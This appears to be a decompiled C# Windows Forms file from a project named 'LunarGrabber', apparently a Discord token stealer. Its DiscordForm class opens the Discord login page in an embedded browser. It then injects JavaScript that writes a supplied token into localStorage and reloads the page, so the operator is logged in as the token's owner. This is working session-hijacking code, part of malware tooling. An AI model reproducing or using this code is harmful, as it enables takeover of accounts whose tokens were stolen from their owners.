using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;
using Microsoft.Web.WebView2.Core;
using Microsoft.Web.WebView2.WinForms;

namespace LunarGrabber
{
	public class DiscordForm : Form
	{
		private int navigationCount;

		private IContainer components;

		private WebView2 webView2;

		private string token { get; set; }

		public DiscordForm(string token)
		{
			InitializeComponent();
			this.token = token;
		}

		private void WebView2_CoreWebView2InitializationCompleted(object sender, CoreWebView2InitializationCompletedEventArgs e)
		{
			webView2.get_CoreWebView2().Navigate("https://discord.com/login");
		}

		private void WebView2_NavigationCompleted(object sender, CoreWebView2NavigationCompletedEventArgs e)
		{
			if (navigationCount == 0)
			{
				webView2.get_CoreWebView2().ExecuteScriptAsync("\r\n                setInterval(() => \r\n                {\r\n                    document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `\"" + token + "\"`\r\n                }, 50);\r\n                setTimeout(() => \r\n                {\r\n                    location.reload();\r\n                }, 2500);");
			}
			navigationCount++;
		}

		private void DiscordForm_Load(object sender, EventArgs e)
		{
			try
			{
				CoreWebView2Environment.GetAvailableBrowserVersionString((string)null);
				webView2.add_NavigationCompleted((EventHandler<CoreWebView2NavigationCompletedEventArgs>)WebView2_NavigationCompleted);
				webView2.EnsureCoreWebView2Async((CoreWebView2Environment)null);
				webView2.add_CoreWebView2InitializationCompleted((EventHandler<CoreWebView2InitializationCompletedEventArgs>)WebView2_CoreWebView2InitializationCompleted);
			}
			catch
			{
				switch (MessageBox.Show("You don't have EdgeWebView installed! Do you want to download it?", OnProgramStart.Name, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation))
				{
				case DialogResult.Yes:
					new WebClient().DownloadFile("https://go.microsoft.com/fwlink/p/?LinkId=2124703", Path.Combine(Path.GetTempPath(), "MicrosoftEdgeWebview2Setup.exe"));
					Process.Start(Path.Combine(Path.GetTempPath(), "MicrosoftEdgeWebview2Setup.exe"));
					Environment.Exit(1);
					break;
				case DialogResult.No:
					Close();
					break;
				}
			}
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			//IL_0001: Unknown result type (might be due to invalid IL or missing references)
			//IL_000b: Expected O, but got Unknown
			webView2 = new WebView2();
			((System.ComponentModel.ISupportInitialize)webView2).BeginInit();
			SuspendLayout();
			webView2.set_CreationProperties((CoreWebView2CreationProperties)null);
			webView2.set_DefaultBackgroundColor(System.Drawing.Color.White);
			((System.Windows.Forms.Control)(object)webView2).Dock = System.Windows.Forms.DockStyle.Fill;
			((System.Windows.Forms.Control)(object)webView2).Location = new System.Drawing.Point(0, 0);
			((System.Windows.Forms.Control)(object)webView2).Name = "webView2";
			((System.Windows.Forms.Control)(object)webView2).Size = new System.Drawing.Size(800, 450);
			((System.Windows.Forms.Control)(object)webView2).TabIndex = 2;
			webView2.set_ZoomFactor(1.0);
			base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new System.Drawing.Size(800, 450);
			base.Controls.Add((System.Windows.Forms.Control)(object)webView2);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
			base.Name = "DiscordForm";
			base.ShowIcon = false;
			Text = "DiscordForm";
			base.WindowState = System.Windows.Forms.FormWindowState.Maximized;
			base.Load += new System.EventHandler(DiscordForm_Load);
			((System.ComponentModel.ISupportInitialize)webView2).EndInit();
			ResumeLayout(false);
		}
	}
}
